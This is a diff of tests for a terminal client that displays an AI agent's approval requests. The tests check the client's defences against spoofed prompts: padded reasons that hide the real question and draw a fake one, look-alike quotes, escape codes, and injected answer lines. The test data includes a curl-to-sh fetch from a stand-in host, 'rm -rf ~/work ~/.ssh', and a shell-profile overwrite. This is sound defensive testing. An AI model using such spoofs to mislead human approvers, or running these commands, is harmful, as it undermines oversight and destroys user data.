@@ -1114,16 +1114,35 @@ const PASTE_START = '\x1b[200~', PASTE_END = '\x1b[201~';
 const CLEARED = '[The client cleared your typed text, because an approval request came. Type it again after you answer.]';
 const NOT_SENT = '[Your line did not go to the chief, because an approval request waits. Answer it, then type your line again.]';
 const PASTED = '[A pasted line cannot answer an approval request, and it did not go to the chief. Type y or n.]';
-const NO_QUESTION = '[No approval request waits, so your line did not go to the chief.]';
+const NO_QUESTION = '[No approval request waits, so your line did not go to the chief. To answer the chief, type yes or no.]';
+const SETTLED = '[The client dropped the keys that you pressed as the approval request showed. Read it, then type y or n.]';
 const refusedBig = (action, why) => `[Agent /root (the chief) asked to ${action}, but ${why}, so the client refused it.]`;
-const ON_SCREEN = 'the request is too big to show on your screen';
+const tooSmall = (action, need, height = 24) => `[Agent /root (the chief) asked to ${action}, but the request needs ${need} rows and your terminal shows ${height}, so the client refused it. Make the terminal window larger to see such a request.]`;
+const unread = action => `[Agent /root (the chief) asked to ${action}, but the client cannot read the request, so the client refused it.]`;
 const RELATIVE = 'paths: relative to the project folder';
+const NOTE = 'note: \\uXXXX is one character, shown as its code.';
+/** The client wraps each line of a question block at the terminal width; each wrapped row starts with "  | ". This
+ * joins each wrapped row to its line again, so a test can compare whole lines. */
+const unwrap = lines => lines.reduce((all, line) => (line.startsWith('  | ') && all.length ? [...all.slice(0, -1), all.at(-1) + line.slice(4)] : [...all, line]), []);
 const REFUSAL = {code: -32601, message: 'Controller transport does not handle this server request'};
 const replies = (run, ids) => run.f.sent.filter(message => ids.includes(message.id) && !message.method);
 const turnTexts = run => run.f.sent.filter(message => message.method === 'turn/start').map(message => message.params.input[0].text);
-const shownOf = run => run.lines().slice(HEADER.length + READY.length);
-/** The last `rows` rows that the lines take on a terminal `columns` wide (each shown character here is 1 column). */
-const screen = (lines, columns = 80, rows = 24) => lines.flatMap(line => (line.match(new RegExp(`.{1,${columns}}`, 'gsu')) ?? [''])).slice(-rows);
+const shownOf = run => unwrap(run.lines().slice(HEADER.length + READY.length));
+/** The rows that the lines take on a terminal `columns` wide, as a terminal draws them: a mark takes no column, each
+ * other character 1 (a block of the client has only printable ASCII; the mark rule is for older output). `first`
+ * says that a row is the start of a line. */
+const terminalRows = (lines, columns) => lines.flatMap(line => {
+  const all = [{row: '', first: true}];
+  let used = 0;
+  for (const char of line) {
+    const width = /\p{M}/u.test(char) ? 0 : 1;
+    if (used + width > columns) { all.push({row: '', first: false}); used = 0; }
+    all.at(-1).row += char; used += width;
+  }
+  return all;
+});
+/** The last `rows` rows that the lines take on a terminal `columns` wide. */
+const screen = (lines, columns = 80, rows = 24) => terminalRows(lines, columns).map(each => each.row).slice(-rows);
 /** Types a line that starts the approval turn, then the answers after the first question shows; ends the turn. A
  * `size` sets the terminal size that the output gives (80 columns and 24 rows when it gives none). */
 async function approvalRun(requests, answers, {before = [], size} = {}) {
@@ -1159,7 +1178,7 @@ const elicitation = (id, params = {}) => ({id, method: 'mcpServer/elicitation/re
 const KINDS = [
   ['a command', [command('s-1')], COMMAND_BLOCK, {decision: 'accept'}, {decision: 'decline'}],
   ['a file change', [{id: 's-1', method: 'item/fileChange/requestApproval', params: {threadId: THREAD, turnId: APPROVAL_TURN, itemId: 'patch-1', startedAtMs: 1, reason: 'adds two notes', grantRoot: null}}],
-    block('change files', ['file: "a.txt"', 'file: "b.txt"', 'reason: "adds two notes"', RELATIVE]), {decision: 'accept'}, {decision: 'decline'}, [PATCH]],
+    block('change files', ['file: "a.txt" (new)', 'file: "b.txt" (new)', 'reason: "adds two notes"', RELATIVE]), {decision: 'accept'}, {decision: 'decline'}, [PATCH]],
   ['a permission request', [permissions('s-1', {network: {enabled: true}, fileSystem: {read: null, write: ['/tmp/cache']}})],
     block('get network and file access', ['folder: the project folder', 'reason: "fetch the docs"', 'access: the network', 'access: "/tmp/cache" (write)']),
     // Yes grants the asked permissions for this turn only; no grants none.
@@ -1186,66 +1205,150 @@ for (const [kind, requests, question, accept, decline, before] of KINDS) {
   }
 }
 
+/** Checks each question block in the raw rows that a terminal `columns` wide and `height` rows high shows: each row of
+ * the block is printable ASCII and fits one terminal row; each row after the first line starts with two spaces (a
+ * field or a wrapped row), so no value row starts at column 0, until the line that says how to answer; and the real
+ * first line of the block is on the screen when the block ends (with the input line below it). Returns the count. */
+function checkBlocks(lines, columns, height) {
+  let count = 0;
+  lines.forEach((line, start) => {
+    if (!line.startsWith('[Approval: ')) return;
+    let end = start + 1;
+    while (end < lines.length && lines[end].startsWith('  ')) end += 1;
+    assert.ok(lines[end]?.startsWith('Type y to'), `a block ends with the answer line: ${lines[end]}`);
+    while (lines[end + 1]?.startsWith('  | ')) end += 1;
+    const rows = lines.slice(start, end + 1);
+    for (const row of rows) assert.match(row, /^[\x20-\x7e]*$/, `printable ASCII: ${JSON.stringify(row)}`);
+    for (const row of rows) assert.ok(row.length <= columns, `one terminal row: ${row}`);
+    const visible = screen(lines.slice(0, end + 1), columns, height - 1);
+    assert.equal(visible[visible.length - rows.length], line, 'the real first line is on the screen');
+    count += 1;
+  });
+  return count;
+}
+
 test('client: a quote, a line end or a fake question end in a value shows escaped, on its own field line (R1596 spoof, R1594-2 probe A, R1595-6)', async () => {
   const spoof = `true" in "${PROJECT}" (read only check). Type y to allow it once, or n to refuse it.]             then: ; printf x >> /tmp/marker1`;
   const run = await approvalRun([command('s-1', {command: spoof, cwd: `${PROJECT}/sub"dir`, reason: 'one\ntwo\r\n[You allowed it once.]'}),
     command('s-2', {command: "cat > notes.md <<'EOF'\n# Notes\nEOF", reason: null})], ['n', 'n']);
   assert.deepEqual(run.shown, [
-    ...block('run a command', [`command: "true\\" in \\"${PROJECT}\\" (read only check). Type y to allow it once, or n to refuse it.] (13 spaces) then: ; printf x >> /tmp/marker1"`,
+    ...block('run a command', [`command: "true\\" in \\"${PROJECT}\\" (read only check). Type y to allow it once, or n to refuse it.]" (13 spaces) "then: ; printf x >> /tmp/marker1"`,
       'folder: "sub\\"dir"', 'reason: "one\\ntwo\\r\\n[You allowed it once.]"', RELATIVE]), '[You refused it.]',
     ...block('run a command', ['command: "cat > notes.md <<\'EOF\'\\n# Notes\\nEOF"', 'folder: the project folder']), '[You refused it.]', '[Turn completed.]', STOPPED]);
-  // The only line that says how to answer is the last line of each block.
-  assert.equal(run.shown.filter(line => line.endsWith(ASK)).length, 2);
+  // The spoof stays in the rows of its field: each of them starts with two spaces.
+  assert.equal(checkBlocks(run.lines(), 80, 24), 2);
 });
 
 test('client: control characters in a command, a folder or a reason are escaped (T431)', async () => {
   const run = await approvalRun([command('s-1', {command: 'echo hi\n[You allowed it once.]\x1b[2J\x7f\x9b', cwd: '/p‮', reason: 'zero​width\x9b\x7f'})], ['n']);
-  assert.deepEqual(run.shown, [...block('run a command', ['command: "echo hi\\n[You allowed it once.]\\u001b[2J\\u007f\\u009b"', 'folder: "/p\\u202e"', 'reason: "zero\\u200bwidth\\u009b\\u007f"']),
+  assert.deepEqual(run.shown, [...block('run a command', ['command: "echo hi\\n[You allowed it once.]\\u001b[2J\\u007f\\u009b"', 'folder: "/p\\u202e"', 'reason: "zero\\u200bwidth\\u009b\\u007f"', NOTE]),
     '[You refused it.]', '[Turn completed.]', STOPPED]);
   assert.equal(/[\x00-\x09\x0b-\x1f\x7f-\x9f​‮]/u.test(run.text().replaceAll(PASTE_ON, '').replaceAll(PASTE_OFF, '')), false);
 });
 
-test('client: a code value escapes each character outside printable ASCII; a reason keeps letters, digits and marks of any script; 3 or more spaces show as a count (R1594-2, R1606-1)', async () => {
-  const run = await approvalRun([command('s-1', {command: 'echo 漢字 «x» 😀　end  two   three', cwd: `${PROJECT}/données`,
-    reason: 'Привет 漢字 café é ٣ ʺquoteʺ “q” 😀　x  y   z w'})], ['n']);
-  assert.deepEqual(run.shown, [...block('run a command', ['command: "echo \\u6f22\\u5b57 \\u00abx\\u00bb \\ud83d\\ude00\\u3000end  two (3 spaces) three"', 'folder: "donn\\u00e9es"',
-    'reason: "Привет 漢字 café é ٣ \\u02baquote\\u02ba \\u201cq\\u201d \\ud83d\\ude00\\u3000x  y (3 spaces) z\\u00a0w"', RELATIVE]), '[You refused it.]', '[Turn completed.]', STOPPED]);
+test('client: every value shows each character outside printable ASCII as \\uXXXX, with a note line; 3 or more spaces show as a count outside the quotes (R1594-2, R1606-1, R1617-2, R1617-3)', async () => {
+  const run = await approvalRun([command('s-1', {command: 'echo 漢字 «x» 😀　end  two   three', cwd: `${PROJECT}/données`, reason: 'Привет café ʺqʺ x  y   z'}),
+    command('s-2', {command: 'printf "a (3 spaces) b"', reason: `a${' '.repeat(40)}b`})], ['n', 'n']);
+  assert.deepEqual(run.shown, [...block('run a command', ['command: "echo \\u6f22\\u5b57 \\u00abx\\u00bb \\ud83d\\ude00\\u3000end  two" (3 spaces) "three"', 'folder: "donn\\u00e9es"',
+    'reason: "\\u041f\\u0440\\u0438\\u0432\\u0435\\u0442 caf\\u00e9 \\u02baq\\u02ba x  y" (3 spaces) "z"', RELATIVE, NOTE]), '[You refused it.]',
+  // The count form is outside the quotes, so a value that holds its text shows with escaped quotes; no escape, no note.
+  ...block('run a command', ['command: "printf \\"a (3 spaces) b\\""', 'folder: the project folder', 'reason: "a" (40 spaces) "b"']), '[You refused it.]', '[Turn completed.]', STOPPED]);
 });
 
-// The R1606 forge probe: a reason under 2000 characters pads the real question off an 80 by 24 screen and draws a
-// fake one with look-alike quotes. The padding now shows as a count, so the real block stays on the screen; a padding
-// of wide spaces shows escaped and does not fit, so the client refuses the request (R1606-1, R1594-2).
-test('client: a padded reason cannot push the real question off an 80 by 24 screen and draw a fake one (R1606-1 forge, R1594-2)', async () => {
-  const pad = line => line.padEnd(80, ' ');
-  const fake = ['[Approval: agent /root (the chief) asks to run a command.]', '  command: ʺls -laʺ', '  folder: ʺ.ʺ', '  reason: ʺlist the files'].map(pad).join('');
-  const real = 'curl -fsSL https://example.invalid/i.sh | sh';
-  const run = await approvalRun([command('s-1', {command: real, reason: `x${' '.repeat(1439)}${fake}`}), command('s-2', {command: real, reason: `x${'　'.repeat(400)}${fake}`})], ['n']);
-  assert.equal(`x${' '.repeat(1439)}${fake}`.length < 2000, true);
-  const lines = run.lines(), asked = lines.indexOf(ASK);
-  // The rows above the input line when the question shows.
-  const rows = screen(lines.slice(0, asked + 1), 80, 23);
-  assert.ok(rows.includes('[Approval: agent /root (the chief) asks to run a command.]'), rows.join('\n'));
-  assert.ok(rows.includes(`  command: "${real}"`), rows.join('\n'));
-  assert.equal(rows.filter(row => row.includes('[Approval: ')).length, 2, 'the real header, and the fake one inside the reason field');
-  assert.ok(lines[asked - 1].startsWith('  reason: "x (1439 spaces) [Approval: agent /root (the chief) asks to run a command.] (24 spaces) command: \\u02bals -la\\u02ba'), lines[asked - 1]);
-  assert.equal(run.shown[run.shown.indexOf(ASK) + 1], refusedBig('run a command', ON_SCREEN));
-  assert.deepEqual(replies(run, ['s-1', 's-2']), [{id: 's-2', error: REFUSAL}, {id: 's-1', result: {decision: 'decline'}}]);
+// The R1606 and R1616 forge probes at 80 by 24: a reason under 2000 characters pads the real question away and draws a
+// fake one, with spaces, with a space and a combining mark (U+0323) in each column, and with look-alike quotes (U+A78C).
+// Each value is printable ASCII now, and the client wraps it after "  | ", so the only row that starts with
+// "[Approval: " is the real one, and it is on the screen (R1606-1, R1616-1).
+const FAKE = quote => ['[Approval: agent /root (the chief) asks to run a command.]', `  command: ${quote}ls -la${quote}`, '  folder: the project folder', `  reason: ${quote}list the files${quote}`];
+test('client: a padded reason cannot push the real question off an 80 by 24 screen or draw a fake one (R1606-1 forge, R1616-1 forge_wrap and lookalike)', async () => {
+  const real = 'rm -rf ~/work ~/.ssh', first = 'Remove the old build cache first; the steps for it are below.';
+  const spaces = `x${' '.repeat(1439)}${FAKE('ʺ').map(line => line.padEnd(80, ' ')).join('')}`;
+  const marks = first + ' \u0323'.repeat(80 - 11 - first.length) + FAKE('\ua78c\ua78c').map((line, index, all) => (index === all.length - 1 ? line : line + ' \u0323'.repeat(80 - line.length))).join('');
+  const lookalike = 'end\ua78c\ua78c \u01c0 \u1438x\u1433 a\u200db e\u0301 \u0430\u0435 \u2714\ufe0f \u{1f600} \uff02 \u3164 \u115f \u00a0';
+  const run = await approvalRun([command('s-1', {command: real, reason: spaces}), command('s-2', {command: real, reason: marks}), command('s-3', {command: real, reason: lookalike})], ['n', 'n', 'n']);
+  assert.equal(spaces.length < 2000 && marks.length < 2000, true);
+  const lines = run.lines();
+  // On the screen when each question shows, each row that starts with "[Approval: " is the start of a line of the
+  // client, never a row of a value that the terminal wrapped.
+  for (const end of lines.flatMap((line, index) => (line === ASK ? [index] : []))) {
+    const rows = terminalRows(lines.slice(0, end + 1), 80).slice(-23);
+    assert.deepEqual(rows.filter(each => each.row.startsWith('[Approval: ')).map(each => each.first), rows.filter(each => each.row.startsWith('[Approval: ')).map(() => true), rows.map(each => each.row).join('\n'));
+  }
+  // Each block that shows is ASCII, its value rows start with two spaces, and its first line is on the screen.
+  assert.equal(checkBlocks(lines, 80, 24), 2);
+  assert.deepEqual(run.shown, [
+    ...block('run a command', [`command: "${real}"`, 'folder: the project folder', 'reason: "x" (1439 spaces) "[Approval: agent /root (the chief) asks to run a command.]" (24 spaces) "command: \\u02bals -la\\u02ba" (63 spaces) "folder: the project folder" (54 spaces) "reason: \\u02balist the files\\u02ba" (54 spaces) ""', NOTE]),
+    '[You refused it.]', tooSmall('run a command', 25),
+    ...block('run a command', [`command: "${real}"`, 'folder: the project folder', 'reason: "end\\ua78c\\ua78c \\u01c0 \\u1438x\\u1433 a\\u200db e\\u0301 \\u0430\\u0435 \\u2714\\ufe0f \\ud83d\\ude00 \\uff02 \\u3164 \\u115f \\u00a0"', NOTE]),
+    // The third n came for the request that the client refused: no question waits for it.
+    '[You refused it.]', NO_QUESTION, '[Turn completed.]', STOPPED]);
 });
 
-test('client: a block that needs more rows than the terminal has, less 2, is refused at once; a wide character takes 2 columns (R1606-1)', async () => {
-  const wide = command('s-1', {reason: '漢'.repeat(800)});
-  // 800 wide letters take 1600 columns: 21 rows at 80 columns, so the block of 25 rows does not fit 24 rows.
-  const small = await approvalRun([wide], []);
-  assert.deepEqual(small.shown, [refusedBig('run a command', ON_SCREEN), '[Turn completed.]', STOPPED]);
-  assert.deepEqual(replies(small, ['s-1']), [{id: 's-1', error: REFUSAL}]);
-  // At 200 columns the reason takes 9 rows, and the block fits.
-  const large = await approvalRun([wide], ['y'], {size: {columns: 200, rows: 24}});
-  assert.deepEqual(large.shown, [...block('run a command', ['command: "npm install"', 'folder: the project folder', `reason: "${'漢'.repeat(800)}"`]), '[You allowed it once.]', '[Turn completed.]', STOPPED]);
-  // A block of exactly the terminal rows less 2 shows: 22 rows at 80 by 24 (a reason line of 1440 columns is 18 rows).
-  const fits = await approvalRun([command('s-1', {reason: 'r'.repeat(1428)})], ['n']);
-  assert.equal(screen(fits.shown.slice(0, fits.shown.indexOf(ASK) + 1), 80, 100).length, 22);
-  const over = await approvalRun([command('s-1', {reason: 'r'.repeat(1429)})], []);
-  assert.deepEqual(over.shown, [refusedBig('run a command', ON_SCREEN), '[Turn completed.]', STOPPED]);
+test('client: the client wraps each line of a block at the terminal width, and each wrapped row starts with "  | " (T431, R1616-1)', async () => {
+  const run = await approvalRun([command('s-1', {reason: 'abcdefghij'.repeat(6)})], ['n'], {size: {columns: 40, rows: 24}});
+  assert.deepEqual(run.lines().slice(HEADER.length + READY.length, HEADER.length + READY.length + 8), [
+    '[Approval: agent /root (the chief) asks ', '  | to run a command.]', '  command: "npm install"', '  folder: the project folder',
+    '  reason: "abcdefghijabcdefghijabcdefghi', '  | jabcdefghijabcdefghijabcdefghij"', 'Type y to allow it once, or n to refuse ', '  | it.']);
+});
+
+test('client: a block fits when its rows, the rows of the note above it and the input line fit the terminal; else it is refused at once, with the rows it needs (R1606-1, R1617-1)', async () => {
+  // At 80 by 24: the header, command, folder and answer lines take 4 rows, the note above the block 2 and the input
+  // line 1. A reason line of 1296 characters takes 17 rows (80, then 76 for each wrapped row): 24 rows in all.
+  const fits = await approvalRun([command('s-1', {reason: 'r'.repeat(1284)})], ['n']);
+  assert.equal(fits.lines().filter(line => line.startsWith('  | ')).length, 16);
+  assert.deepEqual(fits.shown, [...block('run a command', ['command: "npm install"', 'folder: the project folder', `reason: "${'r'.repeat(1284)}"`]), '[You refused it.]', '[Turn completed.]', STOPPED]);
+  const over = await approvalRun([command('s-1', {reason: 'r'.repeat(1285)})], []);
+  assert.deepEqual(over.shown, [tooSmall('run a command', 25), '[Turn completed.]', STOPPED]);
+  assert.deepEqual(replies(over, ['s-1']), [{id: 's-1', result: {decision: 'decline'}}]);
+  // At 200 columns it shows.
+  const large = await approvalRun([command('s-1', {reason: 'r'.repeat(1285)})], ['y'], {size: {columns: 200, rows: 24}});
+  assert.equal(large.shown.at(-3), '[You allowed it once.]');
+});
+
+// R1615-1 and R1616-3 (khitan, cyrillic): letters that a terminal draws 2 columns wide. Each shows as escapes now, 1
+// column for each character, so the client counts the rows of the block exactly.
+test('client: wide and ambiguous-width letters show as escapes, and the rows of the block count exactly (R1615-1, R1616-3 khitan and cyrillic)', async () => {
+  const run = await approvalRun([command('s-1', {command: 'rm -rf ~/work', reason: String.fromCodePoint(0x18B00).repeat(900)}), command('s-2', {command: 'rm -rf ~/work', reason: '\u043e'.repeat(1300)}),
+    command('s-3', {command: 'rm -rf ~/work', reason: `${String.fromCodePoint(0x18B00)}\u043e`})], ['n', 'n', 'n']);
+  // 900 letters outside the BMP are 10800 characters of escapes: a reason line of 143 rows. 1300 letters: 103 rows.
+  assert.deepEqual(run.shown, [tooSmall('run a command', 151), tooSmall('run a command', 111),
+    ...block('run a command', ['command: "rm -rf ~/work"', 'folder: the project folder', 'reason: "\\ud822\\udf00\\u043e"', NOTE]), '[You refused it.]', NO_QUESTION, NO_QUESTION, '[Turn completed.]', STOPPED]);
+  assert.deepEqual(replies(run, ['s-1', 's-2', 's-3']).map(reply => reply.result.decision), ['decline', 'decline', 'decline']);
+});
+
+test('client: each show checks the size again, so a block that no longer fits after a resize is refused at its next show (R1616-2 resize)', async () => {
+  const run = clientRun({fakeOptions: approvalTurn([command('s-1', {command: 'rm -rf ~/work', reason: 'z'.repeat(1990)})])});
+  Object.assign(run.output, {columns: 80, rows: 40});
+  run.input.write('Do the work.\n');
+  await until(() => run.lines().includes(ASK), 'the question');
+  run.output.rows = 24;
+  run.f.emit([{method: 'item/completed', params: {threadId: THREAD, turnId: APPROVAL_TURN, item: {type: 'agentMessage', id: 'm-1', text: 'Working on it.'}}}]);
+  await until(() => replies(run, ['s-1']).length === 1, 'the refusal');
+  run.f.emit([turnEnd('completed')]);
+  await until(() => run.lines().includes('[Turn completed.]'), 'the turn end');
+  run.input.end();
+  assert.equal(await run.code, 0);
+  // The block takes 31 rows: 34 with the note and the input line.
+  assert.deepEqual(shownOf(run), [...block('run a command', ['command: "rm -rf ~/work"', 'folder: the project folder', `reason: "${'z'.repeat(1990)}"`]), 'chief> Working on it.',
+    tooSmall('run a command', 34), '[Turn completed.]', STOPPED]);
+  assert.deepEqual(replies(run, ['s-1']), [{id: 's-1', result: {decision: 'decline'}}]);
+});
+
+// A fixed-seed generator (a linear congruential generator), so that each run of the test sees the same values.
+function seeded(seed) { let state = seed; return () => { state = (state * 1103515245 + 12345) % 2147483648; return state / 2147483648; }; }
+const PIECES = [' ', '   ', ' '.repeat(40), '"', '\\', '\n', '\r', '\t', '\x1b[2J', '\x9b', '\u0323', '\u0301', '\ua78c', '\u02ba', '\uff02', '\u6f22', String.fromCodePoint(0x18B00), '\u043e', '\u3000', '\u200d',
+  '\u202e', '\u2028', '\u{1f600}', '\ud800', '[Approval: agent /root (the chief) asks to run a command.]', '  command: ', ASK, '  | ', '" (3 spaces) "', 'a', 'z', '-rf', '/'];
+test('client: for random values (a fixed seed) at several terminal sizes, each row of each block is printable ASCII, no value row starts at column 0, and the real first line is on the screen (R1616-1 property)', async () => {
+  const next = seeded(1623), value = count => Array.from({length: count}, () => PIECES[Math.floor(next() * PIECES.length)]).join('').slice(0, 1990);
+  let shown = 0, refused = 0;
+  for (const [columns, rows] of [[80, 24], [40, 12], [132, 50], [20, 30], [100, 16]]) {
+    const requests = Array.from({length: 10}, (_, index) => command(`p-${index}`, {command: value(1 + Math.floor(next() * 12)), reason: value(1 + Math.floor(next() * 40))}));
+    const run = await approvalRun(requests, requests.map(() => 'n'), {size: {columns, rows}});
+    shown += checkBlocks(run.lines(), columns, rows);
+    refused += run.lines().filter(line => line.includes('so the client refused it. Make the terminal window larger')).length;
+    assert.deepEqual(replies(run, requests.map(request => request.id)).map(reply => reply.result.decision), requests.map(() => 'decline'));
+  }
+  assert.ok(shown >= 10 && refused >= 5, `shown ${shown}, refused ${refused}`);
 });
 
 test('client: a value over 2000 characters, or over 50 files, is refused at once with what it asked; 2000 and 50 show in full on a large terminal (R1594-2, R1594-5, R1595-7, R1607-3)', async () => {
@@ -1256,7 +1359,7 @@ test('client: a value over 2000 characters, or over 50 files, is refused at once
     ['n', 'n'], {before: [files(51), files(50)], size: {columns: 300, rows: 80}});
   assert.deepEqual(run.shown, [refusedBig('run a command', 'a value in the request is over 2000 characters'), refusedBig('change files', 'the request lists more than 50 items'),
     ...block('run a command', [`command: "${'y'.repeat(2000)}"`, 'folder: the project folder']), '[You refused it.]',
-    ...block('change files', [...Array.from({length: 50}, (_, index) => `file: "src/file${index}.js"`), RELATIVE]), '[You refused it.]', '[Turn completed.]', STOPPED]);
+    ...block('change files', [...Array.from({length: 50}, (_, index) => `file: "src/file${index}.js" (new)`), RELATIVE]), '[You refused it.]', '[Turn completed.]', STOPPED]);
   assert.deepEqual(replies(run, ['s-1', 's-2']), [{id: 's-1', error: REFUSAL}, {id: 's-2', error: REFUSAL}]);
 });
 
@@ -1273,19 +1376,23 @@ test('client: the project folder shows by its name, and a block with a relative 
     ...block('run a command', ['command: "npm install"', `folder: "${join(PROJECT, '..')}"`]), '[You refused it.]', '[Turn completed.]', STOPPED]);
 });
 
-test('client: a path in the project that a link takes out of it shows the link target (R1606-5)', async () => {
+test('client: a path in the project that a link takes out of it shows the link target, also a target that does not exist yet (R1606-5, R1615-3)', async () => {
   const outside = realpathSync(mkdtempSync(join(tmpdir(), 'sage-link-target-')));
   try {
     symlinkSync(outside, join(PROJECT, 'linked-out'));
+    // A link to a file outside the project that does not exist yet (R1615-3).
+    symlinkSync(join(outside, 'missing.txt'), join(PROJECT, 'dangling'));
     mkdirSync(join(PROJECT, 'inner'), {recursive: true}); symlinkSync(join(PROJECT, 'inner'), join(PROJECT, 'linked-in'));
     const patch = {method: 'item/started', params: {threadId: THREAD, turnId: APPROVAL_TURN, item: {type: 'fileChange', id: 'patch-links', status: 'inProgress',
-      changes: [{path: `${PROJECT}/linked-out/new.txt`, kind: {type: 'add'}, diff: 'a'}, {path: `${PROJECT}/linked-in/a.txt`, kind: {type: 'add'}, diff: 'b'}]}}};
+      changes: [{path: `${PROJECT}/linked-out/new.txt`, kind: {type: 'add'}, diff: 'a'}, {path: `${PROJECT}/linked-in/a.txt`, kind: {type: 'update', move_path: null}, diff: 'b'},
+        {path: `${PROJECT}/dangling`, kind: {type: 'add'}, diff: 'c'}]}}};
     const run = await approvalRun([{id: 's-1', method: 'item/fileChange/requestApproval', params: {threadId: THREAD, turnId: APPROVAL_TURN, itemId: 'patch-links', startedAtMs: 1}},
       command('s-2', {cwd: `${PROJECT}/linked-out`, reason: null})], ['n', 'n'], {before: [patch]});
-    assert.deepEqual(run.shown, [...block('change files', [`file: "linked-out/new.txt" (a link to "${outside}/new.txt")`, 'file: "linked-in/a.txt"', RELATIVE]), '[You refused it.]',
+    assert.deepEqual(run.shown, [...block('change files', [`file: "linked-out/new.txt" (a link to "${outside}/new.txt", which does not exist yet) (new)`, 'file: "linked-in/a.txt" (change)',
+      `file: "dangling" (a link to "${outside}/missing.txt", which does not exist yet) (new)`, RELATIVE]), '[You refused it.]',
       ...block('run a command', ['command: "npm install"', `folder: "linked-out" (a link to "${outside}")`, RELATIVE]), '[You refused it.]', '[Turn completed.]', STOPPED]);
   } finally {
-    for (const name of ['linked-out', 'linked-in', 'inner']) rmSync(join(PROJECT, name), {recursive: true, force: true});
+    for (const name of ['linked-out', 'linked-in', 'inner', 'dangling']) rmSync(join(PROJECT, name), {recursive: true, force: true});
     rmSync(outside, {recursive: true, force: true});
   }
 });
@@ -1299,19 +1406,21 @@ test('client: a file change shows each move target under its file, and counts it
   const run = await approvalRun([change('s-1', 'patch-move'), change('s-2', 'patch-many')], ['y'],
     {before: [started('patch-move', [{path: `${PROJECT}/notes.md`, kind: {type: 'update', move_path: home}, diff: '-a\n+b'}, {path: `${PROJECT}/b.txt`, kind: {type: 'update', move_path: null}, diff: ''}]),
       started('patch-many', [...moves, {path: `${PROJECT}/last.txt`, kind: {type: 'add'}, diff: ''}])]});
-  assert.deepEqual(run.shown, [...block('change files', ['file: "notes.md"', `moves to: "${join(PROJECT, '..', 'home-r1605', '.zshrc')}"`, 'file: "b.txt"', RELATIVE]),
-    refusedBig('change files', 'the request lists more than 50 items'), ...block('change files', ['file: "notes.md"', `moves to: "${home}"`, 'file: "b.txt"', RELATIVE]),
+  assert.deepEqual(run.shown, [...block('change files', ['file: "notes.md" (change)', `moves to: "${join(PROJECT, '..', 'home-r1605', '.zshrc')}"`, 'file: "b.txt" (change)', RELATIVE]),
+    refusedBig('change files', 'the request lists more than 50 items'), ...block('change files', ['file: "notes.md" (change)', `moves to: "${home}"`, 'file: "b.txt" (change)', RELATIVE]),
     '[You allowed it once.]', '[Turn completed.]', STOPPED]);
   assert.deepEqual(replies(run, ['s-1', 's-2']), [{id: 's-2', error: REFUSAL}, {id: 's-1', result: {decision: 'accept'}}]);
 });
 
 test('client: a file change with no started fileChange item, with no changes or with a grant root is refused at once (R1605-2 probe 2)', async () => {
+  // A change kind that the client does not know, or a move on a new file, cannot be read (R1617-5).
   const run = await approvalRun([change('s-1', 'patch-none'), change('s-2', 'patch-empty'), change('s-3', 'patch-1', {grantRoot: '/'}),
-    change('s-4', 'patch-bad')], [], {before: [started('patch-empty', []), PATCH, started('patch-bad', [{path: `${PROJECT}/a.txt`, kind: {type: 'update', move_path: 7}}])]});
+    change('s-4', 'patch-bad'), change('s-5', 'patch-kind'), change('s-6', 'patch-add-move')], [], {before: [started('patch-empty', []), PATCH,
+    started('patch-bad', [{path: `${PROJECT}/a.txt`, kind: {type: 'update', move_path: 7}}]), started('patch-kind', [{path: `${PROJECT}/a.txt`, kind: {type: 'rename'}}]),
+    started('patch-add-move', [{path: `${PROJECT}/a.txt`, kind: {type: 'add', move_path: `${PROJECT}/b.txt`}}])]});
   const unknown = '[Agent /root (the chief) asked to change files, but the client does not know which files, so the client refused it.]';
-  const unread = '[Agent /root (the chief) sent an approval request to change files that the client cannot read, so the client refused it.]';
-  assert.deepEqual(run.shown, [unknown, unknown, unread, unread, '[Turn completed.]', STOPPED]);
-  assert.deepEqual(replies(run, ['s-1', 's-2', 's-3', 's-4']).map(reply => reply.error), [REFUSAL, REFUSAL, REFUSAL, REFUSAL]);
+  assert.deepEqual(run.shown, [unknown, unknown, unread('change files'), unread('change files'), unread('change files'), unread('change files'), '[Turn completed.]', STOPPED]);
+  assert.deepEqual(replies(run, ['s-1', 's-2', 's-3', 's-4', 's-5', 's-6']).map(reply => reply.error), [REFUSAL, REFUSAL, REFUSAL, REFUSAL, REFUSAL, REFUSAL]);
 });
 
 test('client: a permission request shows each entry: its path or a plain name, and its access; a legacy root that repeats an entry shows once (R1594-3, R1593-1, R1593-2, R1607-6)', async () => {
@@ -1336,7 +1445,6 @@ test('client: a permission entry or a path list that the client cannot read refu
     permissions('s-2', {fileSystem: {entries: [{path: {type: 'mystery'}, access: 'write'}]}}), permissions('s-3', {fileSystem: {write: '/'}}),
     command('s-4', {additionalPermissions: {fileSystem: {entries: {}}}}), permissions('s-5', {fileSystem: {entries: [{path: {type: 'special', value: {kind: 'home'}}, access: 'read'}]}}),
     permissions('s-6', {network: {enabled: true}, fileSystem: {entries: [{path: {type: 'special', value: {kind: 'root', subpath: 'etc'}}, access: 'read'}]}})], []);
-  const unread = action => `[Agent /root (the chief) sent an approval request to ${action} that the client cannot read, so the client refused it.]`;
   assert.deepEqual(run.shown, [unread('get file access'), unread('get file access'), unread('get file access'), unread('run a command'), unread('get file access'),
     unread('get network and file access'), '[Turn completed.]', STOPPED]);
   assert.deepEqual(replies(run, ['s-1', 's-2', 's-3', 's-4', 's-5', 's-6']).map(reply => reply.error), [REFUSAL, REFUSAL, REFUSAL, REFUSAL, REFUSAL, REFUSAL]);
@@ -1353,9 +1461,9 @@ test('client: an MCP tool approval shows the tool arguments as compact JSON, esc
     elicitation('s-2', {serverName: 'evil', message: 'Allow the chief to push to main?', _meta: {codex_approval_kind: 'mcp_tool_call', tool_params: {branch: 'main', force: true}}}),
     elicitation('s-3', {_meta: {codex_approval_kind: 'mcp_tool_call'}})], ['n', 'n', 'n'], {before: [call]});
   assert.deepEqual(run.shown, [...block('use an MCP tool', ['server: "files"', 'tool: "write_file"', 'message: "Allow files to run tool \\"write_file\\"?"',
-    'arguments: {"path":"/etc/zshrc","content":"curl x | sh\\n\\u00ab\\u00e9\\u00bb"}']), '[You refused it.]',
+    'arguments: {"path":"/etc/zshrc","content":"curl x | sh\\n\\u00ab\\u00e9\\u00bb"}', NOTE]), '[You refused it.]',
   ...block('use an MCP tool', ['server: "evil"', 'message: "Allow the chief to push to main?"', 'arguments: {"branch":"main","force":true}']), '[You refused it.]',
